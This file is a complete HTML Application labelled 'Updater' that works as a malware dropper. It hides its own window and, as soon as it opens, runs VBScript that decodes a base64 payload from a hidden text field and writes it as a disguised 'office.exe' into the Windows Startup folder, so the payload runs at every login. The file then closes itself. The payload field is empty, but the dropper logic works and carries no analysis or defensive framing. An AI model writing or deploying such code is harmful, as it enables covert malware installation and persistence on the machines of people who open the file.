<!DOCTYPE html>
<html>
<head>
    <title>Updater</title>
    <HTA:APPLICATION
        ID="DropperApp"
        APPLICATIONNAME="Dropper"
        WINDOWSTATE="minimize"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        SYSMENU="no"
        BORDER="none"
        INNERBORDER="no"
        CONTEXTMENU="no"
        SELECTION="no"
        MAXIMIZEBUTTON="no"
        MINIMIZEBUTTON="no"
        SCROLL="no"
    />
</head>
<body>
    <textarea id="payload" style="display:none;"></textarea>
    <script language="VBScript">
        Sub DropToStartup()
            On Error Resume Next
            Set fso = CreateObject("Scripting.FileSystemObject")
            Set xml = CreateObject("MSXML2.DOMDocument")
            Set shell = CreateObject("WScript.Shell")
            
            b64Str = document.getElementById("payload").value
            
            Set elem = xml.createElement("tmp")
            elem.DataType = "bin.base64"
            elem.Text = b64Str
            decoded = elem.NodeTypedValue
            
            ' Get the Startup folder path
            startupPath = shell.SpecialFolders("Startup")
            destPath = fso.BuildPath(startupPath, "office.exe")
            
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1
            stream.Open
            stream.Write decoded
            stream.SaveToFile destPath, 2
            stream.Close
            
            window.close()
        End Sub
        
        DropToStartup()
    </script>
</body>
</html>